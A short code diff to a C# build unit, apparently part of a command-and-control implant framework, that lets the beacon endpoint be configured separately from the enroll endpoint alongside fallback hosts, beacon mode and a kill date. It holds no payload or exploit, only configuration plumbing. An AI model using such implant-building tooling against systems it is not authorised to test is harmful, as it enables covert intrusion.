@@ -277,7 +277,11 @@ public sealed class DotNetBuildUnit : IBuildUnit
         var map = new Dictionary<string, object>
         {
             ["enrollURL"] = @params.Transport.Endpoint,
-            ["beaconURL"] = BeaconUrlFromEnroll(@params.Transport.Endpoint),
+            // The beacon host is the enroll host (the single-front shape)
+            // unless the build names a split -- enroll on one socket, the
+            // gRPC beacon on another (architecture.md Sec 8).
+            ["beaconURL"] = @params.Transport.BeaconEndpoint
+                ?? BeaconUrlFromEnroll(@params.Transport.Endpoint),
             ["fallbackEnrollURLs"] = @params.Transport.FallbackEndpoints.ToArray(),
             ["mode"] = @params.Beacon.Mode,
             ["killDate"] = @params.Beacon.KillDate.ToString("O"),
